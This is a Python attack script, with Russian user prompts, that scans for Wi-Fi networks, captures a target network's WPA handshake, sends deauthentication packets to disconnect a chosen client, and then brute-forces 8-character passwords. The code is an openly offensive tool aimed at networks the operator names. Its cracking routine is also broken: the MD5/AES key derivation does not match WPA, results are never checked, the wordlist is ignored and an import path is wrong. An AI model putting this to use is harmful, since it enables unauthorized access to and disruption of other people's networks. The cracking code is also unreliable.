import subprocess
import time
import sys
import os
import hashlib
from binascii import hexlify
from pycryptodome.Cipher import AES
from pycryptodome.Util.Padding import pad
from itertools import product
import string

def enable_monitor_mode(interface):
    subprocess.run(["airmon-ng", "start", interface], check=True)

def disable_monitor_mode(interface):
    subprocess.run(["airmon-ng", "stop", interface], check=True)

def capture_handshake(interface, target_bssid, output_file, channel, timeout):
    capture_process = subprocess.Popen([
        "airodump-ng",
        "--bssid", target_bssid,
        "-c", channel,
        "-w", output_file,
        interface
    ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    start_time = time.time()
    while True:
        elapsed_time = time.time() - start_time
        if elapsed_time > timeout:
            capture_process.terminate()
            return None

        output = capture_process.stdout.readline()
        if output and "WPA handshake" in output.decode():
            capture_process.terminate()
            return output_file

        time.sleep(1)

def send_deauth_packets(interface, target_bssid, station_mac):
    subprocess.run([
        "aireplay-ng",
        "--deauth", "10",
        "-a", target_bssid,
        "-c", station_mac,
        interface
    ], check=True)

def wpa_hcrack(password, ssid, eapol):
    key = password.encode("utf-8")
    
    hash1 = hashlib.md5(key).digest()
    hash2 = hashlib.md5(hash1).digest()

    cipher = AES.new(hash2, AES.MODE_CBC, iv=b"\0" * 16)
    encrypted = cipher.encrypt(pad(eapol, AES.block_size))

    return encrypted

def crack_password_from_hccapx(hccapx_file, wordlist, rate_limit):
    with open(hccapx_file, "rb") as f:
        eapol = f.read()

    charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
    counter = 0
    rate = rate_limit / 60.0

    for length in range(8, 9):
        for guess in product(charset, repeat=length):
            password = ''.join(guess)
            wpa_hcrack(password, "SSID_PLACEHOLDER", eapol)

            counter += 1
            if counter >= rate:
                time.sleep(1)

def main():
    interface = input("Введите имя беспроводного интерфейса: ").strip()
    enable_monitor_mode(interface)

    try:
        time.sleep(2)
        subprocess.run(["airodump-ng", interface], check=True)
    except KeyboardInterrupt:
        print("\nСканирование завершено.")

    target_bssid = input("Введите BSSID целевой сети: ").strip()
    channel = input("Введите канал сети: ").strip()
    output_file = input("Введите имя выходного файла: ").strip()

    captured_file = capture_handshake(interface, target_bssid, output_file, channel, timeout=120)

    if captured_file is None:
        print("Не удалось захватить хендшейк. Завершаем программу.")
        disable_monitor_mode(interface)
        sys.exit(1)

    send_deauth = input("Отправить deauth пакеты для ускорения захвата? (y/n): ").strip().lower()
    if send_deauth == 'y':
        station_mac = input("Введите MAC адрес клиента: ").strip()
        send_deauth_packets(interface, target_bssid, station_mac)

    wordlist_file = input("Введите путь к словарю паролей: ").strip()
    crack_password_from_hccapx(captured_file + "-01.cap", wordlist_file, rate_limit=2000)

    disable_monitor_mode(interface)
    print(f"\nПерехват завершён. Проверьте файл: {captured_file}-01.cap")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nПрограмма прервана пользователем.")
    except subprocess.CalledProcessError as e:
        print(f"Ошибка выполнения команды: {e}")
    except Exception as e:
        print(f"Произошла ошибка: {e}")
